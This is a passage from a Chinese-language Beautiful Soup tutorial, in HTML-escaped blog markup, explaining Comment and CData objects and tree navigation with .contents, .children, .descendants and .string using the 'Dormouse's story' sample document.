&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;[document]&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;注释及特殊字符串&quot;&gt;&lt;a href=&quot;#注释及特殊字符串&quot; class=&quot;headerlink&quot; title=&quot;注释及特殊字符串&quot;&gt;&lt;/a&gt;注释及特殊字符串&lt;/h2&gt;&lt;p&gt;&lt;code&gt;Tag&lt;/code&gt; , &lt;code&gt;NavigableString&lt;/code&gt; , &lt;code&gt;BeautifulSoup&lt;/code&gt; 几乎覆盖了html和xml中的所有内容,但是还有一些特殊对象.容易让人担心的内容是文档的注释部分:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;quot;&amp;lt;b&amp;gt;&amp;lt;!--Hey, buddy. Want to buy a used parser?--&amp;gt;&amp;lt;/b&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;comment = soup.b.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;type(comment)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;class &amp;apos;bs4.element.Comment&amp;apos;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;Comment&lt;/code&gt; 对象是一个特殊类型的 &lt;code&gt;NavigableString&lt;/code&gt; 对象:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;comment&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Hey, buddy. Want to buy a used parser&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是当它出现在HTML文档中时, &lt;code&gt;Comment&lt;/code&gt; 对象会使用特殊的格式输出:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;print(soup.b.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;!--Hey, buddy. Want to buy a used parser?--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Beautiful Soup中定义的其它类型都可能会出现在XML的文档中: &lt;code&gt;CData&lt;/code&gt; , &lt;code&gt;ProcessingInstruction&lt;/code&gt; , &lt;code&gt;Declaration&lt;/code&gt; , &lt;code&gt;Doctype&lt;/code&gt; .与 &lt;code&gt;Comment&lt;/code&gt; 对象类似,这些类都是 &lt;code&gt;NavigableString&lt;/code&gt; 的子类,只是添加了一些额外的方法的字符串独享.下面是用CDATA来替代注释的例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import CData&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cdata = CData(&amp;quot;A CDATA block&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;comment.replace_with(cdata)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(soup.b.prettify())&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;![CDATA[A CDATA block]]&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;遍历文档树&quot;&gt;&lt;a href=&quot;#遍历文档树&quot; class=&quot;headerlink&quot; title=&quot;遍历文档树&quot;&gt;&lt;/a&gt;遍历文档树&lt;/h1&gt;&lt;p&gt;还拿”爱丽丝梦游仙境”的文档来做例子:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;html_doc = &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;title&amp;quot;&amp;gt;&amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;Once upon a time there were three little sisters; and their names were&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/elsie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/lacie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt; and&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;a href=&amp;quot;http://example.com/tillie&amp;quot; class=&amp;quot;sister&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;and they lived at the bottom of a well.&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;p class=&amp;quot;story&amp;quot;&amp;gt;...&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from bs4 import BeautifulSoup&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(html_doc)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过这段例子来演示怎样从文档的一段内容找到另一段内容&lt;/p&gt;
&lt;h2 id=&quot;子节点&quot;&gt;&lt;a href=&quot;#子节点&quot; class=&quot;headerlink&quot; title=&quot;子节点&quot;&gt;&lt;/a&gt;子节点&lt;/h2&gt;&lt;p&gt;一个Tag可能包含多个字符串或其它的Tag,这些都是这个Tag的子节点.Beautiful Soup提供了许多操作和遍历子节点的属性.&lt;/p&gt;
&lt;p&gt;注意: Beautiful Soup中字符串节点不支持这些属性,因为字符串没有子节点&lt;/p&gt;
&lt;h3 id=&quot;tag的名字&quot;&gt;&lt;a href=&quot;#tag的名字&quot; class=&quot;headerlink&quot; title=&quot;tag的名字&quot;&gt;&lt;/a&gt;tag的名字&lt;/h3&gt;&lt;p&gt;操作文档树最简单的方法就是告诉它你想获取的tag的name.如果想获取 &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt; 标签,只要用 &lt;code&gt;soup.head&lt;/code&gt; :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.head&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.title&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是个获取tag的小窍门,可以在文档树的tag中多次调用这个方法.下面的代码可以获取&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;标签中的第一个&lt;code&gt;&amp;lt;b&amp;gt;&lt;/code&gt;标签:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.body.b&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;b&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/b&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过点取属性的方式只能获得当前名字的第一个tag:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.a&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果想要得到所有的&lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;标签,或是通过名字得到比一个tag更多的内容的时候,就需要用到 &lt;code&gt;Searching the tree&lt;/code&gt; 中描述的方法,比如: find_all()&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.find_all(&amp;apos;a&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/elsie&amp;quot; id=&amp;quot;link1&amp;quot;&amp;gt;Elsie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/lacie&amp;quot; id=&amp;quot;link2&amp;quot;&amp;gt;Lacie&amp;lt;/a&amp;gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;a class=&amp;quot;sister&amp;quot; href=&amp;quot;http://example.com/tillie&amp;quot; id=&amp;quot;link3&amp;quot;&amp;gt;Tillie&amp;lt;/a&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;contents-和-children&quot;&gt;&lt;a href=&quot;#contents-和-children&quot; class=&quot;headerlink&quot; title=&quot;.contents 和 .children&quot;&gt;&lt;/a&gt;.contents 和 .children&lt;/h3&gt;&lt;p&gt;tag的 &lt;code&gt;.contents&lt;/code&gt; 属性可以将tag的子节点以列表的方式输出:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;head_tag = soup.head&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;head_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;head_tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;title_tag = head_tag.contents[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;title_tag&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;title_tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;The Dormouse&amp;apos;s story&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;BeautifulSoup&lt;/code&gt; 对象本身一定会包含子节点,也就是说&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;标签也是 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的子节点:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;len(soup.contents)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.contents[0].name&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;html&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;字符串没有 &lt;code&gt;.contents&lt;/code&gt; 属性,因为字符串没有子节点:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;text = title_tag.contents[0]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;text.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# AttributeError: &amp;apos;NavigableString&amp;apos; object has no attribute &amp;apos;contents&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过tag的 &lt;code&gt;.children&lt;/code&gt; 生成器,可以对tag的子节点进行循环:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for child in title_tag.children:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(child)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;descendants&quot;&gt;&lt;a href=&quot;#descendants&quot; class=&quot;headerlink&quot; title=&quot;.descendants&quot;&gt;&lt;/a&gt;.descendants&lt;/h3&gt;&lt;p&gt;&lt;code&gt;.contents&lt;/code&gt; 和 &lt;code&gt;.children&lt;/code&gt; 属性仅包含tag的直接子节点.例如,&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;标签只有一个直接子节点&lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;head_tag.contents&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [&amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但是&lt;code&gt;&amp;lt;title&amp;gt;&lt;/code&gt;标签也包含一个子节点:字符串 “The Dormouse’s story”,这种情况下字符串 “The Dormouse’s story”也属于&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;标签的子孙节点. &lt;code&gt;.descendants&lt;/code&gt; 属性可以对所有tag的子孙节点进行递归循环 [5] :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;for child in head_tag.descendants:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    print(child)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # &amp;lt;title&amp;gt;The Dormouse&amp;apos;s story&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # The Dormouse&amp;apos;s story&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面的例子中, &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;标签只有一个子节点,但是有2个子孙节点:&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;节点和&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;的子节点, &lt;code&gt;BeautifulSoup&lt;/code&gt; 有一个直接子节点(&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;节点),却有很多子孙节点:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;len(list(soup.children))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;len(list(soup.descendants))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;string&quot;&gt;&lt;a href=&quot;#string&quot; class=&quot;headerlink&quot; title=&quot;.string&quot;&gt;&lt;/a&gt;.string&lt;/h3&gt;&lt;p&gt;如果tag只有一个 &lt;code&gt;NavigableString&lt;/code&gt; 类型子节点,那么这个tag可以使用 &lt;code&gt;.string&lt;/code&gt; 得到子节点:&lt;/p&gt;
